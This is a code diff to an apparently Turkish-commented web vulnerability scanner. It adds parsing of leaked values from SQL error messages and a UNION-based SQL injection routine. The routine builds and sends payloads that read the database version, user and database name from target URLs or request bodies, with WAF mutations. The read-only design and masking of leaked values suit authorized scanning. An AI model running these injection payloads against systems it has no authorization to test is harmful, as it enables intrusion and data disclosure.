@@ -852,6 +852,45 @@ def detect_sqli_error_signature(body: str) -> Optional[Tuple[str, float]]:
     return None
 
 
+# Hata metnine GÖMÜLÜ sızan değerin çözümlemesi (SAF): imza yalnız "hata var" derdi —
+# bu desenler XPATH/duplicate-entry/conversion hatalarının TAŞIDIĞI gerçeği (sürüm, kullanıcı,
+# nesne adı) çıkarır. Kalıplar DB sürücülerinin SABİT çıktısıdır (sqlmap error-mapping +
+# DB dokümantasyonu). Değer iddia değil, yanıtta geçen metindir.
+_SQLI_ERROR_VALUE_PATTERNS = [
+    ("mysql-xpath", re.compile(r"XPATH syntax error:\s*['\"]~([^~'\"]{1,80})~['\"]", re.I)),
+    ("mysql-duplicate", re.compile(r"Duplicate entry '([^']{1,80})' for key", re.I)),
+    ("mssql-conversion", re.compile(
+        r"Conversion failed when converting the n?varchar value '([^']{1,80})'", re.I)),
+    ("pg-cast", re.compile(r'invalid input syntax for[^\"]*:\s*"([^"]{1,80})"', re.I)),
+    ("sqlite-token", re.compile(r'unrecognized token: "([^"]{1,80})"', re.I)),
+]
+
+
+def _mask_sqli_leaked_value(value: str) -> str:
+    """Sızan değeri maskele (SAF): sürüm-benzeri (5.7.44-log) AÇIK — kanıt için gerekli
+    ve sır değil; kimlik-benzeri (root@db) MASKELİ (ilk 3 karakter + uzunluk) — rapor
+    sızıntıyı büyütmeyecek, kanıt değeri kaybolmayacak."""
+    v = (value or "").strip()
+    if not v:
+        return "?"
+    if re.fullmatch(r"v?\d+(\.\d+)+[+.\w-]*", v):
+        return v
+    return f"{v[:3]}*** (uzunluk {len(v)})"
+
+
+def extract_sqli_error_value(body: str) -> Optional[Tuple[str, str]]:
+    """Hata gövdesine gömülü sızan değeri çıkar (SAF). Döner (kaynak_desen, maskeli_değer);
+    gömülü değer yoksa None. Kullanım: error-orakl kanıtını "imza var" → "veri sızdı"
+    derinliğine taşır."""
+    if not body:
+        return None
+    for src, rx in _SQLI_ERROR_VALUE_PATTERNS:
+        m = rx.search(body)
+        if m:
+            return src, _mask_sqli_leaked_value(m.group(1))
+    return None
+
+
 def confirm_boolean_sqli(true_bodies: List[Optional[str]],
                          false_bodies: List[Optional[str]]) -> Tuple[bool, str]:
     """Boolean-based blind SQLi diferansiyeli (SAF): TRUE koşullu ve FALSE koşullu
@@ -972,10 +1011,15 @@ async def verify_error_based_sqli(
                     mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                     leak_note = " — hata mesajı VERİ TAŞIYOR (sürüm/nesne adı ifşası)" \
                         if "leak" in name or "unknown" in name else ""
+                    # Kanıt derinleştirme: hata metnine gömülü SIZAN DEĞER varsa taşınır
+                    # (sürüm açık, kimlik maskeli) — "imza eşleşti" değil, "veri sızdı".
+                    leaked = extract_sqli_error_value(resp)
+                    value_note = f" Hata metnine gömülü sızan değer ({leaked[0]}): {leaked[1]}." \
+                        if leaked else ""
                     return SqliVerdict(
                         True, conf, "error-based-sqli",
                         f"'{payload}' enjeksiyonuna yanıtta '{name}' DB hata imzası "
-                        f"(baseline'da yok, {where} bağlamı{leak_note}). "
+                        f"(baseline'da yok, {where} bağlamı{leak_note}).{value_note} "
                         f"Error-based SQL injection TEYİT edildi.{mut_note}",
                         mutation=mut_name)
             if sent >= max_req:
@@ -1044,6 +1088,144 @@ async def verify_boolean_based_sqli(
                        "sorguya girmiyor veya çıktı SQL koşulundan bağımsız.")
 
 
+# ============================================================
+# UNION tabanlı salt-okunur VERİ ÇEKİMİ — "hata imzası var" değil, "veriyi okudum" kanıtı
+# ============================================================
+# Oracle'lar "sorgu çalışıyor" der; UNION çekimi sorgu SONUCUNU yanıtta gösterir —
+# siyah-kutu SQLi'nin en derin kanıtı budur. TAHRİBATSIZ: yalnız-okunur ifadeler
+# (@@version / user() / database() / version() / current_user / SUSER_SNAME() /
+# sqlite_version()) — yazma/silme/yürütme YOK.
+# KANIT MEKANİZMASI: taze nonce'lu alfanümerik marker'lar SQL string literal'inde
+# CONCAT/|| ile değerin BAŞINA ve SONUNA sarılır → yanıtta marker'lar ARASINDA dönen
+# metin = sorgu çıktısıdır. Taze nonce: bayat yankı/rastgele eşleşme FP'si imkânsız.
+# Kolon dizilimi NULL-dolgu ile 1..6 kolon denenir (ayrı kolon-sayım turu GEREKMEZ —
+# istek ekonomisi); lehçe başına 1 ifade, ilk marker yankısında ERKEN DURUR.
+
+_UNION_MARK_PREFIX = "Kad1mU"
+_UNION_PAYLOAD_TAIL = "-- -"
+_SQLI_UNION_MAX_REQ_DEFAULT = 20
+
+# (lehçe, ifade şablonu) — {S}/{E} taze marker literal'leri; değer ayraçı '|'.
+_UNION_EXPR_TEMPLATES = [
+    ("mysql", "CONCAT('{S}',@@version,'|',user(),'|',database(),'{E}')"),
+    ("postgres", "('{S}'||version()||'|'||current_user||'{E}')"),
+    ("mssql", "CONCAT('{S}',@@version,'|',SUSER_SNAME(),'{E}')"),
+    ("sqlite", "('{S}'||sqlite_version()||'{E}')"),
+]
+# UNION kolon dizilimleri: ifade SON kolona yerleşir (SELECT kolon sayısı eşleşmesi için
+# NULL dolgu). Sıra yaygın→seyrek: 2-5 kolon (tablo/kart sorguları), sonra 1 ve 6.
+_UNION_SHAPE_NULLS = (1, 2, 3, 4, 0, 5)
+# Sorgu bağlamı ön-ekleri: tırnaklı (string) ve tırnaksız (sayısal) kırılım.
+_UNION_CONTEXTS = ("'", "")
+
+
+def _union_markers() -> Tuple[str, str]:
+    """Taze marker çifti (S=başlangıç, E=bitiş). Alfanümerik — SQL string literal'inde
+    ek tırnak gerektirmez, URL'de okunur kalır (mock-test edilebilir)."""
+    n = _secrets.token_hex(6)
+    return f"{_UNION_MARK_PREFIX}{n}S", f"{_UNION_MARK_PREFIX}{n}E"
+
+
+def parse_union_extracted(body: str, mark_start: str, mark_end: str) -> Optional[List[str]]:
+    """Marker'lar arasındaki '|' ayraçlı çekilen değer listesini çıkar (SAF).
+    Başlangıç marker'ı yoksa veya kapanış yoksa None (bu yanıt veri döndürmedi)."""
+    if not body or not mark_start or not mark_end:
+        return None
+    i = body.find(mark_start)
+    if i < 0:
+        return None
+    j = body.find(mark_end, i + len(mark_start))
+    if j < 0:
+        return None
+    return [p.strip() for p in body[i + len(mark_start):j].split("|")]
+
+
+async def verify_union_extraction(
+    url: str, client: httpx.AsyncClient, *,
+    mutations: Optional[List[Mutation]] = None,
+    method: str = "get", body_params: Any = None, body_kind: str = "form",
+) -> SqliVerdict:
+    """UNION SELECT ile salt-okunur VERİ ÇEKİMİ — SQLi'de "veriyi okudum" kanıtı.
+
+    Bağlam × kolon-dizilimi × lehçe uzayında dener; marker yankısı gelene kadar ilerler,
+    ilk yankıda ERKEN DURUR (tek kanıt yeter doktrini). Çekilen değerler maskelenerek
+    kanıt metnine taşınır (sürüm açık, kimlik maskeli).
+    TAHRİBATSİZ: yalnız-okunur SELECT ifadeleri. İstek tavanı SQLI_UNION_MAX_REQ
+    (varsayılan 20). Gövde hattı: method gövde metodu + body_params varsa enjeksiyon
+    GÖVDEYE iner (API yüzeyinin gerçek SQLi yeri)."""
+    m = (method or "get").lower()
+    bparams = body_params_dict(body_params)
+    use_body = m in ("post", "put", "patch") and bool(bparams)
+    send_json = body_kind == "json"
+    max_req = int(os.getenv("SQLI_UNION_MAX_REQ", str(_SQLI_UNION_MAX_REQ_DEFAULT)) or 20)
+
+    async def _send(inj_url: Optional[str], body: Optional[Dict[str, str]]) -> Optional[str]:
+        if body is not None:
+            if send_json:
+                return await _fetch_body_any(client, url, method=m.upper(), json_data=body)
+            return await _fetch_body_any(client, url, method=m.upper(), form_data=body)
+        return await _fetch_body_any(client, inj_url or url)
+
+    sent = 0
+    injected_any = False
+    for ctx in _UNION_CONTEXTS:
+        for nulls in _UNION_SHAPE_NULLS:
+            pad = "NULL," * nulls
+            col_count = nulls + 1
+            for dialect, tmpl in _UNION_EXPR_TEMPLATES:
+                mark_s, mark_e = _union_markers()
+                expr = tmpl.replace("{S}", mark_s).replace("{E}", mark_e)
+                base_payload = f"{ctx} UNION SELECT {pad}{expr}{_UNION_PAYLOAD_TAIL}"
+                for payload, mut_name in apply_mutations(base_payload, mutations or [],
+                                                        include_identity=not mutations):
+                    if use_body:
+                        candidates = [(None, b, p) for b, p in
+                                      build_injected_bodies(bparams, payload)]
+                    else:
+                        candidates = [(u, None, None) for u in
+                                      build_injected_urls(url, payload)]
+                    for inj_url, body, hit_p in candidates:
+                        if sent >= max_req:
+                            break
+                        injected_any = True
+                        sent += 1
+                        resp = await _send(inj_url, body)
+                        vals = parse_union_extracted(resp or "", mark_s, mark_e)
+                        if vals is None:
+                            continue
+                        shown = [_mask_sqli_leaked_value(v) for v in vals if v]
+                        if not shown:
+                            continue
+                        where = f"gövde '{hit_p}'" if (use_body and hit_p) else "sorgu"
+                        mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
+                        ctx_label = "tırnaklı" if ctx else "sayısal"
+                        return SqliVerdict(
+                            True, 0.95, "union-data-extraction",
+                            f"{ctx_label} bağlamda {col_count} kolonlu UNION düzeni "
+                            f"({dialect} lehçesi) sorgu SONUCUNU yanıtta okuttu ({where} "
+                            f"bağlamı{mut_note}). Marker'lar arasında dönen çekilen değerler: "
+                            f"{' | '.join(shown)} (kimlik değerleri maskeli). "
+                            f"SQL injection'da VERİ OKUMA TEYİT edildi — yalnız-okunur "
+                            f"ifadeler (sürüm/kullanıcı sorgusu); yazma/yürütme YOK.",
+                            mutation=mut_name)
+                    if sent >= max_req:
+                        break
+                if sent >= max_req:
+                    break
+            if sent >= max_req:
+                break
+        if sent >= max_req:
+            break
+    if not injected_any:
+        where = "gövde" if use_body else "sorgu"
+        return SqliVerdict(False, 0.0, "union-data-extraction",
+                           f"Enjekte edilebilir {where} parametresi yok.", skipped=True)
+    return SqliVerdict(False, 0.0, "union-data-extraction",
+                       "Hiçbir UNION düzeninde marker yankılanmadı — kolon sayısı/lehçe "
+                       "eşleşmedi ya da UNION çıktısı filtreleniyor (diğer oraklların "
+                       "kararı geçerlidir).")
+
+
 async def verify_sqli(
     url: str, client: httpx.AsyncClient, *,
     delay_seconds: float = 5.0,
@@ -1052,26 +1234,42 @@ async def verify_sqli(
     method: str = "get", body_params: Any = None, body_kind: str = "form",
 ) -> SqliVerdict:
     """SQLi zincir oraklı — ucuzdan pahalıya: error-based (1 istek/payload) →
-    boolean-based (4 istek/çift) → time-based (D sn/ölçüm). İlk teyitte durur;
-    hiçbiri doğrulamazsa ZAMAN-oraklının kararı döner (geriye-uyumlu detay).
-    Env kapıları: SQLI_ERROR_ORACLE / SQLI_BOOL_ORACLE (varsayılan AÇIK — pasif-ish,
-    yalnız SELECT-bağlamı payload'lar)."""
+    boolean-based (4 istek/çift) → UNION veri çekimi (1 istek/düzen) → time-based
+    (D sn/ölçüm). UNION bilerek time'dan ÖNCE: hem ucuz hem EN DERİN kanıtı üretir;
+    bir orakl teyit ettiyse kanıtı DERİNLEŞTİRİR (veri okuma), teyit yoksa kendi başına
+    orakldır (marker-echo = doğrudan kanıt). Hiçbiri doğrulamazsa ZAMAN-oraklının kararı
+    döner (geriye-uyumlu detay).
+    Env kapıları: SQLI_ERROR_ORACLE / SQLI_BOOL_ORACLE / SQLI_UNION_ORACLE (varsayılan AÇIK;
+    yıkıcı payload yok — hepsi SELECT-bağlamı/okuma)."""
     kw = dict(mutations=mutations, method=method, body_params=body_params,
               body_kind=body_kind)
+    confirmed: Optional[SqliVerdict] = None
     if _flag_enabled("SQLI_ERROR_ORACLE"):
         try:
             v = await verify_error_based_sqli(url, client, **kw)
             if v.verified:
-                return v
+                confirmed = v
         except Exception:  # orakl hatası zinciri düşürmez — sonraki orakl sürer
             pass
-    if _flag_enabled("SQLI_BOOL_ORACLE"):
+    if confirmed is None and _flag_enabled("SQLI_BOOL_ORACLE"):
         try:
             v = await verify_boolean_based_sqli(url, client, **kw)
             if v.verified:
-                return v
+                confirmed = v
         except Exception:
             pass
+    if _flag_enabled("SQLI_UNION_ORACLE"):
+        try:
+            uv = await verify_union_extraction(url, client, **kw)
+            if uv.verified:
+                if confirmed is not None:
+                    uv.detail = (f"[önceki orakl {confirmed.method} ile teyit etmişti — "
+                                 f"kanıt UNION çekimiyle derinleştirildi] " + uv.detail)
+                return uv
+        except Exception:
+            pass
+    if confirmed is not None:
+        return confirmed
     return await verify_time_based_sqli(url, client, delay_seconds=delay_seconds,
                                         control_samples=control_samples, **kw)
 
